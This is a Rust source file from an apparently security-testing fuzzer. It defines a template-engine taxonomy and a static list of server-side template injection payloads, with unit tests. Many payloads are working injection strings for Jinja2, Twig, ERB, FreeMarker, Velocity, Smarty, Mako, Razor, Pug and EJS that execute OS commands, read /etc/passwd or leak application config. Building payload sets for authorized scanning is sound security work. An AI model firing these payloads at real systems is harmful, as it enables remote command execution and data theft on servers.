//! Static server-side template injection payloads, and the [`TemplateEngine`]
//! taxonomy that labels them.
//!
//! These are **data**. `TemplateEngine` moved here because `get_payloads` tags
//! every payload with its engine; it is *moved*, never re-typed, and the engine
//! re-exports it so `eggsec::fuzzer::advanced::TemplateEngine` keeps resolving.
//!
//! The SSTI *prober* — `SstiFuzzer`, `detect_from_response`, and the live
//! `reqwest` detection methods — stays in the `eggsec` engine, in
//! `eggsec::fuzzer::payloads::ssti`.

use super::{Payload, PayloadType, Severity};
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    ERB,
    FreeMarker,
    Velocity,
    Smarty,
    Handlebars,
    Mako,
    Cheetah,
    DotNet,
    Jade,
    EJS,
    Underscore,
    Phusion,
}

impl std::fmt::Display for TemplateEngine {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TemplateEngine::Jinja2 => write!(f, "Jinja2 (Python)"),
            TemplateEngine::Twig => write!(f, "Twig (PHP)"),
            TemplateEngine::ERB => write!(f, "ERB (Ruby)"),
            TemplateEngine::FreeMarker => write!(f, "FreeMarker (Java)"),
            TemplateEngine::Velocity => write!(f, "Velocity (Java)"),
            TemplateEngine::Smarty => write!(f, "Smarty (PHP)"),
            TemplateEngine::Handlebars => write!(f, "Handlebars (JS)"),
            TemplateEngine::Mako => write!(f, "Mako (Python)"),
            TemplateEngine::Cheetah => write!(f, "Cheetah (Python)"),
            TemplateEngine::DotNet => write!(f, "ASP.NET Razor"),
            TemplateEngine::Jade => write!(f, "Jade/Pug"),
            TemplateEngine::EJS => write!(f, "EJS"),
            TemplateEngine::Underscore => write!(f, "Underscore.js"),
            TemplateEngine::Phusion => write!(f, "Phusion Passenger"),
        }
    }
}

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let ssti_payloads = vec![
        (
            "{{7*7}}",
            "Jinja2 - basic math",
            TemplateEngine::Jinja2,
            Severity::High,
        ),
        (
            "{{config}}",
            "Jinja2 - config leak",
            TemplateEngine::Jinja2,
            Severity::Critical,
        ),
        (
            "<%= 7*7 %>",
            "ERB - basic math",
            TemplateEngine::ERB,
            Severity::High,
        ),
        (
            "<%= system('id') %>",
            "ERB - command execution",
            TemplateEngine::ERB,
            Severity::Critical,
        ),
        (
            "${7*7}",
            "FreeMarker - basic math",
            TemplateEngine::FreeMarker,
            Severity::High,
        ),
        (
            "{7*7}",
            "Smarty - basic math",
            TemplateEngine::Smarty,
            Severity::High,
        ),
        (
            "{{7*7}}",
            "Handlebars - basic math",
            TemplateEngine::Handlebars,
            Severity::High,
        ),
        (
            "${7*7}",
            "Mako - basic math",
            TemplateEngine::Mako,
            Severity::High,
        ),
        (
            "@(7*7)",
            "Razor - basic math",
            TemplateEngine::DotNet,
            Severity::High,
        ),
        (
            "!= 7*7",
            "Jade/Pug - basic math",
            TemplateEngine::Jade,
            Severity::High,
        ),
        (
            "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "Jinja2 - OS command execution",
            TemplateEngine::Jinja2,
            Severity::Critical,
        ),
        (
            "{{config.items()}}",
            "Jinja2 - Flask config disclosure",
            TemplateEngine::Jinja2,
            Severity::Critical,
        ),
        (
            "{{source('/etc/passwd')}}",
            "Twig - file read",
            TemplateEngine::Twig,
            Severity::Critical,
        ),
        (
            "{{['id']|map('system')|join}}",
            "Twig - command execution",
            TemplateEngine::Twig,
            Severity::Critical,
        ),
        (
            "<%= File.read('/etc/passwd') %>",
            "ERB - file read",
            TemplateEngine::ERB,
            Severity::Critical,
        ),
        (
            "<%= IO.popen('id').read %>",
            "ERB - command execution",
            TemplateEngine::ERB,
            Severity::Critical,
        ),
        (
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            "FreeMarker - Execute RCE",
            TemplateEngine::FreeMarker,
            Severity::Critical,
        ),
        (
            "#set($x = '')${x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
            "Velocity - command execution",
            TemplateEngine::Velocity,
            Severity::Critical,
        ),
        (
            "{php}system('id');{/php}",
            "Smarty - command execution",
            TemplateEngine::Smarty,
            Severity::Critical,
        ),
        (
            "{{#with (lookup . \"__proto__\")}}{{/with}}",
            "Handlebars - prototype access",
            TemplateEngine::Handlebars,
            Severity::High,
        ),
        (
            "<% import os %>${os.popen('id').read()}",
            "Mako - command execution",
            TemplateEngine::Mako,
            Severity::Critical,
        ),
        (
            "@(new System.Diagnostics.Process { StartInfo = new System.Diagnostics.ProcessStartInfo { FileName = \"cmd\", Arguments = \"/c id\" } }.Start())",
            "Razor - command execution",
            TemplateEngine::DotNet,
            Severity::Critical,
        ),
        (
            "- require('child_process').execSync('id')",
            "Pug - command execution",
            TemplateEngine::Jade,
            Severity::Critical,
        ),
        (
            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
            "EJS - command execution",
            TemplateEngine::EJS,
            Severity::Critical,
        ),
        (
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
            "Twig - filter injection",
            TemplateEngine::Twig,
            Severity::Critical,
        ),
        (
            "{self::getStream('file:///etc/passwd')}",
            "Smarty - file read",
            TemplateEngine::Smarty,
            Severity::Critical,
        ),
        (
            "$util.include(\"file:///etc/passwd\")",
            "Velocity - file read",
            TemplateEngine::Velocity,
            Severity::Critical,
        ),
    ];

    for (payload, desc, engine, severity) in ssti_payloads {
        payloads.push(Payload {
            payload_type: PayloadType::Ssti,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["ssti".to_string(), format!("{:?}", engine).to_lowercase()],
        });
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty_and_labelled() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Ssti);
            assert!(!p.payload.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn covers_the_major_template_families() {
        let payloads = get_payloads();
        for (needle, engine) in [
            ("{{7*7}}", "Jinja2"),
            ("<%= 7*7 %>", "ERB"),
            ("${7*7}", "FreeMarker"),
            ("{7*7}", "Smarty"),
        ] {
            assert!(
                payloads.iter().any(|p| p.payload == needle),
                "missing the basic-math probe for {engine}: {needle}"
            );
        }
        assert!(
            payloads
                .iter()
                .any(|p| p.payload.contains("system('id')") || p.payload.contains("exec('id')")),
            "missing a command-execution probe"
        );
    }

    /// `TemplateEngine` moved into this crate so `get_payloads` can tag payloads
    /// with it. It is moved, never re-typed: the engine re-exports this same
    /// enum, so these labels are the ones the engine's prober matches on.
    #[test]
    fn template_engine_labels_are_stable() {
        assert_eq!(TemplateEngine::Jinja2.to_string(), "Jinja2 (Python)");
        assert_eq!(TemplateEngine::ERB.to_string(), "ERB (Ruby)");
        assert_eq!(TemplateEngine::FreeMarker.to_string(), "FreeMarker (Java)");
    }
}
